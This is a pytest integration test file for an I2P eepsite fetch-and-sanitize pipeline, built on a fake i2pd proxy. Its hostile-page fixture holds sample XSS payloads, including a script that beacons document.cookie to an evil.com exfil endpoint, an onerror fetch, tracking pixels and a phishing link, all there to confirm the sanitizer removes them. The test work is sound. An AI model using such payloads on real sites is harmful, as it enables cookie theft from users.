"""
Laboratory-grade deterministic integration harness for the I2P browse
pipeline (i2p_fetch → html_sanitizer → /browse endpoint).

This is the "forked-state" layer: a high-fidelity fake i2pd HTTP proxy
that replays i2pd's ACTUAL wire behavior — captured from a live i2pd
2.60 (see scripts/tests/fixtures/i2pd_*.html) — so the entire fetch +
sanitize + serve chain is exercised end-to-end, deterministically, with
zero network flakiness. CI-safe and reproducible.

Faithfulness to real i2pd (verified against the live daemon):
  - The proxy is addressed with an ABSOLUTE-URI request line
    ("GET http://host.i2p/path HTTP/1.1"), exactly as i2p_fetch sends.
  - Host-not-found → HTTP 500 + the real "Proxy error: Host not found"
    body (loaded from the captured fixture, byte-for-byte).
  - Clearnet-without-outproxy → HTTP 500 + real "Outproxy failure" body.
  - Supports chunked transfer-encoding, redirects (301/302/307),
    slow-response (tunnel-build latency), and oversize bodies so the
    fetcher's caps + timeouts + redirect handling are all covered.

The live-network ground-truth layer lives in test_i2p_live.py (marked
@pytest.mark.live, skipped unless ECHELON_I2P_LIVE=1).
"""
from __future__ import annotations

import http.server
import socket
import threading
import time
from contextlib import closing
from pathlib import Path

import pytest

from scripts import i2p_fetch
from scripts.i2p_fetch import I2pFetchError, fetch_eepsite

FIXTURES = Path(__file__).resolve().parent / "fixtures"
HOST_NOT_FOUND_BODY = (FIXTURES / "i2pd_host_not_found.html").read_bytes()
OUTPROXY_FAILURE_BODY = (FIXTURES / "i2pd_outproxy_failure.html").read_bytes()


def _free_port() -> int:
    with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class FakeI2pdProxy(http.server.BaseHTTPRequestHandler):
    """High-fidelity i2pd HTTP-proxy replay.

    Routes on the absolute-URI host the daemon requests. Each host name
    triggers a specific faithful behavior. The handler is configured via
    class attributes so a test can register routes before booting.
    """

    protocol_version = "HTTP/1.1"

    # host (lowercase) -> behavior dict. Set per-test.
    routes: dict = {}

    def log_message(self, *a):
        pass

    def _host(self) -> str:
        # Absolute-URI request: self.path is the full "http://host/path".
        from urllib.parse import urlparse
        return (urlparse(self.path).hostname or "").lower()

    def do_GET(self):  # noqa: N802
        host = self._host()
        route = type(self).routes.get(host)
        if route is None:
            # Default: behave like i2pd host-not-found.
            self._send_raw(500, "text/html; charset=UTF-8", HOST_NOT_FOUND_BODY)
            return
        kind = route["kind"]

        if kind == "host_not_found":
            self._send_raw(500, "text/html; charset=UTF-8", HOST_NOT_FOUND_BODY)
        elif kind == "outproxy_failure":
            self._send_raw(500, "text/html; charset=UTF-8", OUTPROXY_FAILURE_BODY)
        elif kind == "ok":
            self._send_raw(200, route.get("ctype", "text/html"), route["body"])
        elif kind == "ok_chunked":
            self._send_chunked(200, route.get("ctype", "text/html"), route["body"])
        elif kind == "slow":
            time.sleep(route["delay"])
            self._send_raw(200, route.get("ctype", "text/html"), route["body"])
        elif kind == "redirect":
            self.send_response(route.get("status", 302))
            self.send_header("Location", route["location"])
            self.send_header("Content-Length", "0")
            self.send_header("Connection", "close")
            self.end_headers()
        elif kind == "oversize":
            self._send_raw(200, "text/html", b"x" * route["size"])
        elif kind == "status":
            self._send_raw(route["status"], route.get("ctype", "text/html"), route.get("body", b""))
        else:
            self._send_raw(500, "text/html", HOST_NOT_FOUND_BODY)

    def _send_raw(self, status: int, ctype: str, body: bytes):
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def _send_chunked(self, status: int, ctype: str, body: bytes):
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Transfer-Encoding", "chunked")
        self.send_header("Connection", "close")
        self.end_headers()
        # Emit in 3 chunks to exercise chunked decoding.
        third = max(1, len(body) // 3)
        for i in range(0, len(body), third):
            chunk = body[i:i + third]
            self.wfile.write(f"{len(chunk):x}\r\n".encode())
            self.wfile.write(chunk)
            self.wfile.write(b"\r\n")
        self.wfile.write(b"0\r\n\r\n")


@pytest.fixture
def fake_i2pd():
    """Boot the fake proxy; yield (port, register_fn). register(host, **route)
    adds a route. Routes reset each test."""
    FakeI2pdProxy.routes = {}
    port = _free_port()
    server = http.server.ThreadingHTTPServer(("127.0.0.1", port), FakeI2pdProxy)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    time.sleep(0.05)

    def register(host: str, **route):
        FakeI2pdProxy.routes[host.lower()] = route

    try:
        yield port, register
    finally:
        server.shutdown()
        server.server_close()
        FakeI2pdProxy.routes = {}


# ── Fetcher behavior against faithful i2pd replay ───────────────────


class TestFetchFidelity:
    def test_ok_html_fetch(self, fake_i2pd):
        port, register = fake_i2pd
        register("good.i2p", kind="ok", body=b"<html><body>hi</body></html>")
        r = fetch_eepsite("good.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert r.status == 200
        assert b"hi" in r.body

    def test_host_not_found_is_dns_failed(self, fake_i2pd):
        """Against REAL i2pd wire behavior: host-not-found is a 500 with
        the 'Proxy error: Host not found' body — NOT a 404. This is the
        bug the live run caught."""
        port, register = fake_i2pd
        register("missing.i2p", kind="host_not_found")
        with pytest.raises(I2pFetchError) as exc:
            fetch_eepsite("missing.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert exc.value.reason == "dns-failed"

    def test_unregistered_host_defaults_to_dns_failed(self, fake_i2pd):
        port, register = fake_i2pd
        with pytest.raises(I2pFetchError) as exc:
            fetch_eepsite("never-registered.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert exc.value.reason == "dns-failed"

    def test_outproxy_failure_is_bad_host(self, fake_i2pd):
        """i2pd returns 500 'Outproxy failure' for clearnet-without-outproxy.
        We can't even reach this via fetch_eepsite (clearnet rejected at
        normalize), so we drive the proxy directly with an .i2p host the
        fake maps to the outproxy-failure body — proving the classifier."""
        port, register = fake_i2pd
        register("pretends-clearnet.i2p", kind="outproxy_failure")
        with pytest.raises(I2pFetchError) as exc:
            fetch_eepsite("pretends-clearnet.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert exc.value.reason == "bad-host"

    def test_chunked_transfer_decoded(self, fake_i2pd):
        port, register = fake_i2pd
        big = b"<html><body>" + b"A" * 50_000 + b"</body></html>"
        register("chunked.i2p", kind="ok_chunked", body=big)
        r = fetch_eepsite("chunked.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert r.status == 200
        assert len(r.body) == len(big)
        assert r.body == big

    def test_redirect_followed(self, fake_i2pd):
        port, register = fake_i2pd
        register("start.i2p", kind="redirect", status=302, location="http://dest.i2p/page")
        register("dest.i2p", kind="ok", body=b"<html>arrived</html>")
        r = fetch_eepsite("start.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert b"arrived" in r.body
        assert "dest.i2p" in r.final_url

    def test_redirect_to_clearnet_rejected(self, fake_i2pd):
        """A redirect Location pointing at clearnet must be refused — an
        eepsite must not be able to bounce the fetch off-network."""
        port, register = fake_i2pd
        register("evilredir.i2p", kind="redirect", status=302, location="https://evil.com/x")
        with pytest.raises(I2pFetchError) as exc:
            fetch_eepsite("evilredir.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert exc.value.reason == "bad-host"

    def test_redirect_loop_bounded(self, fake_i2pd):
        port, register = fake_i2pd
        register("loop.i2p", kind="redirect", status=302, location="http://loop.i2p/again")
        with pytest.raises(I2pFetchError):
            fetch_eepsite("loop.i2p", proxy_host="127.0.0.1", proxy_port=port)

    def test_oversize_body_capped(self, fake_i2pd):
        port, register = fake_i2pd
        register("huge.i2p", kind="oversize", size=i2p_fetch.RESPONSE_BODY_CAP + 1024)
        with pytest.raises(I2pFetchError) as exc:
            fetch_eepsite("huge.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert exc.value.reason == "too-large"

    def test_502_is_tunnel_timeout(self, fake_i2pd):
        port, register = fake_i2pd
        register("bad.i2p", kind="status", status=502)
        with pytest.raises(I2pFetchError) as exc:
            fetch_eepsite("bad.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert exc.value.reason == "tunnel-timeout"

    def test_503_is_rate_limited(self, fake_i2pd):
        port, register = fake_i2pd
        register("busy.i2p", kind="status", status=503)
        with pytest.raises(I2pFetchError) as exc:
            fetch_eepsite("busy.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert exc.value.reason == "rate-limited"

    def test_genuine_eepsite_500_passes_through(self, fake_i2pd):
        """A 500 that is NOT an i2pd proxy error (no 'Proxy error' body)
        is the eepsite's own — pass it through, don't misclassify."""
        port, register = fake_i2pd
        register("brokensite.i2p", kind="status", status=500,
                 body=b"<html>app crashed</html>")
        r = fetch_eepsite("brokensite.i2p", proxy_host="127.0.0.1", proxy_port=port)
        assert r.status == 500
        assert b"app crashed" in r.body

    def test_connection_refused_is_no_i2pd(self):
        dead = _free_port()
        with pytest.raises(I2pFetchError) as exc:
            fetch_eepsite("x.i2p", proxy_host="127.0.0.1", proxy_port=dead)
        assert exc.value.reason == "no-i2pd"


# ── Full pipeline: fetch a hostile eepsite, prove sanitized output ──


class TestFullPipelineDeterministic:
    HOSTILE_EEPSITE = (
        b"<html><head><title>Hostile</title></head><body>"
        b"<h1>Looks innocent</h1>"
        b'<img src="https://tracker.evil.com/pixel.gif?id=victim">'
        b'<img src="/logo.png">'
        b'<script>navigator.sendBeacon("https://evil.com/exfil", document.cookie)</script>'
        b'<iframe src="https://ads.evil.com/frame"></iframe>'
        b'<a href="https://evil.com/phish">login here</a>'
        b'<a href="/real-page">internal link</a>'
        b'<div style="background:url(https://evil.com/bg.png)">styled</div>'
        b'<img src=x onerror="fetch(\'https://evil.com/onerror\')">'
        b"</body></html>"
    )

    def test_hostile_eepsite_fully_sanitized(self, fake_i2pd):
        from scripts import html_sanitizer
        port, register = fake_i2pd
        register("hostile.i2p", kind="ok", body=self.HOSTILE_EEPSITE)

        fetched = fetch_eepsite("hostile.i2p", proxy_host="127.0.0.1", proxy_port=port)
        safe, report = html_sanitizer.sanitize_html(
            fetched.body.decode("utf-8"), fetched.final_url,
        )

        low = safe.lower()
        # No clearnet origin survives.
        assert "evil.com" not in low
        assert "tracker.evil.com" not in low
        assert "ads.evil.com" not in low
        # No script.
        assert "<script" not in low
        assert "onerror" not in low
        # Legit content survives.
        assert "looks innocent" in low
        # In-network resources rewritten to the daemon proxy.
        assert "/browse/resource?url=" in safe
        assert "/browse?url=" in safe
        # The report counted real blocks.
        assert report.blocked_clearnet >= 3
        assert report.scripts_removed >= 1
        assert report.handlers_removed >= 1
